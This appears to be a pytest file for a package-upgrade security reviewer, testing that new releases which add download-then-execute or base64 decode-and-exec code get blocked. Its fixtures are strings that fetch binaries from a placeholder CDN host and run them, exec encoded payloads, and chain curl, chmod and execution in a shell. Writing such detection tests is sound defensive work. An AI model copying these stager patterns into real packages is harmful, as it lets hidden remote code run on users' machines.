from __future__ import annotations

import base64

from tests.test_upgrade_review import _kinds, _one, registry

from ca9 import api

__all__ = ["registry"]

PAYLOAD = base64.b64encode(b"import os\nos.system('uname -a')\n").decode()
HEAD = "import base64, os, shutil, subprocess, sys, tempfile, urllib.request\nimport requests\nfrom pathlib import Path\n"

SHAPES = {
    "decode-write-run": (
        "def warm():\n"
        "    p = os.path.join(tempfile.gettempdir(), 'cache_warm.py')\n"
        "    with open(p, 'wb') as f:\n"
        f"        f.write(base64.b64decode('{PAYLOAD}'))\n"
        "    subprocess.run([sys.executable, p])\n"
    ),
    "retrieve-run-pyz": (
        "def sync():\n"
        "    urllib.request.urlretrieve('https://cdn.files.dev/a.pyz', '/tmp/agent.pyz')\n"
        "    subprocess.Popen(['python3', '/tmp/agent.pyz'])\n"
    ),
    "curl-then-run": (
        "TARGET = os.path.join(tempfile.gettempdir(), 'helper.pyz')\n"
        "def refresh():\n"
        "    subprocess.run(['curl', '-sL', '-o', TARGET, 'https://cdn.files.dev/h'])\n"
        "    subprocess.Popen([sys.executable, TARGET])\n"
    ),
    "fetch-chmod-run": (
        "def start(cfg):\n"
        "    p = Path(tempfile.gettempdir()) / 'svc'\n"
        "    p.write_bytes(requests.get('https://cdn.files.dev/svc').content)\n"
        "    os.chmod(p, 0o755)\n"
        "    return subprocess.Popen([str(p), '--serve', cfg])\n"
    ),
    "chmod-shipped-run": (
        "def trigger(cfg):\n"
        "    exe = os.path.join(os.path.dirname(__file__), 'bin', 'helper')\n"
        "    os.chmod(exe, 0o770)\n"
        "    subprocess.Popen([exe, '--config', cfg], stdout=subprocess.DEVNULL)\n"
    ),
    "python-c": (
        "def boot():\n"
        "    subprocess.Popen([sys.executable, '-c', "
        f"f\"import base64; exec(base64.b64decode('{PAYLOAD}'))\"])\n"
    ),
    "node-e": (
        "def boot():\n"
        "    subprocess.run(['node', '-e', \"require('child_process').execSync('id')\"])\n"
    ),
    "shell-chain": (
        "def fetch(dst, url):\n"
        "    os.system(f'curl -s -o {dst} {url} && chmod +x {dst} && {dst}')\n"
    ),
}

QUIET = (
    "import json, os, subprocess, sys, tempfile, urllib.request\n"
    "def load(url):\n"
    "    p = os.path.join(tempfile.gettempdir(), 'index.json')\n"
    "    urllib.request.urlretrieve(url, p)\n"
    "    with open(p) as f:\n"
    "        return json.load(f)\n"
    "def save(cfg):\n"
    "    with open('settings.cfg', 'w') as f:\n"
    "        f.write(cfg)\n"
    "    os.chmod('settings.cfg', 0o644)\n"
    "    return subprocess.run(['git', 'status'])\n"
    "def info():\n"
    "    subprocess.run([sys.executable, '-c', 'import sys; print(sys.version)'])\n"
    "    return subprocess.run([sys.executable, '-m', 'pip', '--version'])\n"
)


def _upgrade(registry, name, code, *, old=None):
    registry.pypi(
        name, "1.0", wheel={f"{name}/__init__.py": "X = 1\n", f"{name}/tools.py": old or "Y = 1\n"}
    )
    registry.pypi(name, "1.1", wheel={f"{name}/__init__.py": "X = 1\n", f"{name}/tools.py": code})
    return _one("pypi", name, "1.0", "1.1")[0]


def test_staging_a_file_then_running_it_blocks_even_at_use_time(registry):
    for index, (shape, code) in enumerate(SHAPES.items()):
        result = _upgrade(registry, f"stage{index}", HEAD + code)
        kinds = _kinds(result, "block")
        assert kinds == ["new_decode_exec"], shape
        assert result["block"][0]["path"] == f"stage{index}/tools.py", shape


def test_downloads_writes_and_runs_that_are_not_chained_stay_quiet(registry):
    result = _upgrade(registry, "quietpkg", QUIET)

    assert result["block"] == [] and result["warn"] == []


def test_a_stager_that_was_already_there_is_not_new(registry):
    code = HEAD + SHAPES["chmod-shipped-run"]

    result = _upgrade(registry, "samepkg", code + "\nVERSION = 2\n", old=code)

    assert result["block"] == []
    assert result["unchanged_risky_by_kind"] == {"new_decode_exec": 1}


def test_first_release_use_time_installers_are_left_to_import_and_install_rules(registry):
    registry.pypi(
        "toolfetch",
        "1.0",
        wheel={
            "toolfetch/__init__.py": "X = 1\n",
            "toolfetch/get.py": HEAD + SHAPES["chmod-shipped-run"],
        },
    )

    result = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "toolfetch", "old": None, "new": "1.0"}]
    )

    assert result["results"][0]["block"] == []


def test_inline_python_code_at_import_time_is_decode_exec(registry):
    code = (
        "import subprocess, sys\n"
        "BLOB = '" + PAYLOAD + "'\n"
        "subprocess.Popen([sys.executable, '-c', f\"import base64; exec(base64.b64decode('{BLOB}'))\"])\n"
    )

    result = _upgrade(registry, "inlinepkg", code)

    assert _kinds(result, "block") == ["new_decode_exec"]


def test_inline_code_that_only_execs_a_local_literal_stays_quiet(registry):
    cell = (
        "if 1:\\n    import textwrap\\n    ns = {}\\n"
        "    exec(compile(textwrap.dedent('''\\n        def f(x):\\n            return x * 2\\n    '''), "
        "'<cell>', 'exec'), None, ns)\\n"
    )
    code = (
        "import subprocess, sys\n"
        f'CELL = "{cell}"\n'
        "def check(location):\n"
        "    return subprocess.run([sys.executable, '-c', CELL, location], capture_output=True)\n"
    )

    result = _upgrade(registry, "cellpkg", code)

    assert result["block"] == [] and result["warn"] == []
